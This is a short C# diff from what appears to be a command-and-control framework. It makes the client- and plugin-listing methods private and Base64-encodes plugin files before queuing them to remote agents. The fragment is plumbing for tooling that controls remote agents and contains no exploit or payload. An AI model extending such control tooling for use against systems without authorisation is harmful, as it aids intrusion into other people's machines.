@@ -99,7 +99,7 @@ _________         _________ _               ______   _______
                 }
             }
         }
-        public string[] ListClients(){
+        private string[] ListClients(){
             //Converts client list to a string array
             //List<Agent> agents = this.listener.agents;
             //var enum = this.listener.agents.GetEnumerator();
@@ -113,7 +113,7 @@ _________         _________ _               ______   _______
             return agentArr;
         }
 
-        public string[] ListPlugins(){
+        private string[] ListPlugins(){
             //shows all plugins in the plugin folder
             var plugins = this.listener.pluginDict;
             string[] pluginArr = new string[plugins.Count];
@@ -161,7 +161,7 @@ _________         _________ _               ______   _______
                     //add plugin to command que
                     //should add the specific function to be run by the plugin
                     //but that's for later
-                    agent.commandQue.AddLast(new string[]{thirdprompt, "plugin"});
+                    agent.commandQue.AddLast(new string[]{this.listener.Base64EncodeFile(thirdprompt), "plugin"});
                     Console.WriteLine("\n");
                     return 0;
                 } else {
